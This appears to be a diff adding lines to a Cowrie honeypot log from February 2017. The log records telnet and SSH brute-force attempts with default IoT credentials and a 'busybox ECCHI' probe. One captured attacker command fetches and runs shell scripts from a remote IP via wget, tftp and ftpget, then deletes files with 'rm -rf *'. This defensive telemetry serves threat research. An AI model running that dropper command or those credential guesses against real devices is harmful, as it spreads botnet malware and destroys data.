@@ -3609,3 +3609,110 @@
 2017-02-28T08:41:58+0000 [CowrieTelnetTransport,16032,218.90.237.118] login attempt [root/root] succeeded
 2017-02-28T08:41:59+0000 [CowrieTelnetTransport,16032,218.90.237.118] Opening TTY Log: log/tty/20170228-084159-None-16032i.log
 2017-02-28T08:41:59+0000 [CowrieTelnetTransport,16032,218.90.237.118] Warning: state changed and new state returned
+2017-02-28T08:42:04+0000 [CowrieTelnetTransport,16033,185.2.82.7] Connection lost after 37 seconds
+2017-02-28T08:42:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:51217 (10.8.41.81:2223) [session: TT16035]
+2017-02-28T08:42:11+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.51:52455 (10.8.41.81:2222) [session: 59c83782]
+2017-02-28T08:42:12+0000 [HoneyPotSSHTransport,3582,116.31.116.51] Remote SSH version: SSH-2.0-PUTTY
+2017-02-28T08:42:12+0000 [HoneyPotSSHTransport,3582,116.31.116.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-28T08:42:12+0000 [HoneyPotSSHTransport,3582,116.31.116.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:12+0000 [HoneyPotSSHTransport,3582,116.31.116.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt: 13820
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt [root/54321] failed
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt: 13821
+2017-02-28T08:42:14+0000 [CowrieTelnetTransport,16035,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:15+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt [enable/shell] failed
+2017-02-28T08:42:15+0000 [CowrieTelnetTransport,16035,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:15+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt: 13822
+2017-02-28T08:42:15+0000 [CowrieTelnetTransport,16035,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:16+0000 [CowrieTelnetTransport,16035,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-28T08:42:16+0000 [CowrieTelnetTransport,16035,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.248.161.2/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.248.161.2 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.248.161.2; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.248.161.2 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: cd /tmp
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: cd /var/run
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: cd /mnt
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: cd /root
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: cd /
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Command found: wget http://89.248.161.2/bins.sh
+2017-02-28T08:42:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.248.161.2/bins.sh>
+2017-02-28T08:42:18+0000 [CowrieTelnetTransport,16032,218.90.237.118] Received unhandled keyID: '\x00'
+2017-02-28T08:42:20+0000 [CowrieTelnetTransport,16032,218.90.237.118] Unhandled Error
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/log.py", line 103, in callWithLogger
+	    return callWithContext({"system": lp}, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/log.py", line 86, in callWithContext
+	    return context.call({ILogContext: newCtx}, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 122, in callWithContext
+	    return self.currentContext().callWithContext(ctx, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 85, in callWithContext
+	    return func(*args,**kw)
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/posixbase.py", line 597, in _doReadOrWrite
+	    why = selectable.doRead()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/tcp.py", line 208, in doRead
+	    return self._dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/tcp.py", line 214, in _dataReceived
+	    rval = self.protocol.dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/telnet.py", line 585, in dataReceived
+	    raise ValueError("Stumped", b)
+	exceptions.ValueError: ('Stumped', '\xcc')
+	
+2017-02-28T08:42:20+0000 [CowrieTelnetTransport,16032,218.90.237.118] Closing TTY Log: log/tty/20170228-084159-None-16032i.log after 20 seconds
+2017-02-28T08:42:20+0000 [CowrieTelnetTransport,16032,218.90.237.118] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <type 'exceptions.ValueError'>: ('Stumped', '\xcc')
+	]
+2017-02-28T08:42:20+0000 [CowrieTelnetTransport,16032,218.90.237.118] Connection lost after 56 seconds
+2017-02-28T08:42:27+0000 [CowrieTelnetTransport,16034,185.2.82.7] Connection lost after 36 seconds
+2017-02-28T08:42:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:38831 (10.8.41.81:2223) [session: TT16036]
+2017-02-28T08:42:38+0000 [HoneyPotSSHTransport,3582,116.31.116.51] connection lost
+2017-02-28T08:42:38+0000 [HoneyPotSSHTransport,3582,116.31.116.51] Connection lost after 26 seconds
+2017-02-28T08:42:40+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.51:58580 (10.8.41.81:2222) [session: 02f7516d]
+2017-02-28T08:42:41+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt: 13823
+2017-02-28T08:42:41+0000 [CowrieTelnetTransport,16036,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:42+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt [root/dreambox] failed
+2017-02-28T08:42:42+0000 [CowrieTelnetTransport,16036,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:42+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt: 13824
+2017-02-28T08:42:42+0000 [CowrieTelnetTransport,16036,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:42+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt [enable/shell] failed
+2017-02-28T08:42:43+0000 [CowrieTelnetTransport,16036,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:43+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt: 13825
+2017-02-28T08:42:43+0000 [CowrieTelnetTransport,16036,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:43+0000 [CowrieTelnetTransport,16036,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-28T08:42:43+0000 [CowrieTelnetTransport,16036,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:43+0000 [HoneyPotSSHTransport,3583,116.31.116.51] Remote SSH version: SSH-2.0-PUTTY
+2017-02-28T08:42:43+0000 [HoneyPotSSHTransport,3583,116.31.116.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-28T08:42:43+0000 [HoneyPotSSHTransport,3583,116.31.116.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:43+0000 [HoneyPotSSHTransport,3583,116.31.116.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:47+0000 [CowrieTelnetTransport,16035,185.2.82.6] Connection lost after 38 seconds
+2017-02-28T08:42:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:57684 (10.8.41.81:2223) [session: TT16037]
+2017-02-28T08:42:48+0000 [-] Connection was probably lost. Could not write to terminal
+2017-02-28T08:42:48+0000 [-] Connection was probably lost. Could not write to terminal
+2017-02-28T08:42:48+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.248.161.2/bins.sh>
+2017-02-28T08:42:52+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 104.128.105.34:43079 (10.8.41.81:2223) [session: TT16038]
+2017-02-28T08:42:52+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt: 13826
+2017-02-28T08:42:52+0000 [CowrieTelnetTransport,16037,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:53+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt [admin/admin] failed
+2017-02-28T08:42:53+0000 [CowrieTelnetTransport,16037,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:53+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt: 13827
+2017-02-28T08:42:53+0000 [CowrieTelnetTransport,16037,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:54+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt [enable/shell] failed
+2017-02-28T08:42:54+0000 [CowrieTelnetTransport,16037,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:54+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt: 13828
+2017-02-28T08:42:54+0000 [CowrieTelnetTransport,16037,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-28T08:42:55+0000 [CowrieTelnetTransport,16037,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-28T08:42:55+0000 [CowrieTelnetTransport,16037,185.2.82.6] Warning: state changed and new state returned
+2017-02-28T08:42:55+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 223.100.160.65:49304 (10.8.41.81:2222) [session: 8fbda3a7]
+2017-02-28T08:42:55+0000 [HoneyPotSSHTransport,3584,223.100.160.65] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-02-28T08:42:55+0000 [HoneyPotSSHTransport,3584,223.100.160.65] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-28T08:42:55+0000 [HoneyPotSSHTransport,3584,223.100.160.65] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:55+0000 [HoneyPotSSHTransport,3584,223.100.160.65] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-28T08:42:56+0000 [HoneyPotSSHTransport,3584,223.100.160.65] NEW KEYS
+2017-02-28T08:42:56+0000 [HoneyPotSSHTransport,3584,223.100.160.65] starting service 'ssh-userauth'
+2017-02-28T08:42:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3584,223.100.160.65] 'user02' trying auth 'password'
+2017-02-28T08:42:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3584,223.100.160.65] login attempt: 126
+2017-02-28T08:42:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3584,223.100.160.65] login return, expect: [agent/agent]
+2017-02-28T08:42:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3584,223.100.160.65] login attempt [user02/user02] failed
+2017-02-28T08:42:58+0000 [-] 'user02' failed auth 'password'
+2017-02-28T08:42:58+0000 [-] unauthorized login: 
+2017-02-28T08:42:58+0000 [HoneyPotSSHTransport,3584,223.100.160.65] connection lost
+2017-02-28T08:42:58+0000 [HoneyPotSSHTransport,3584,223.100.160.65] Connection lost after 3 seconds
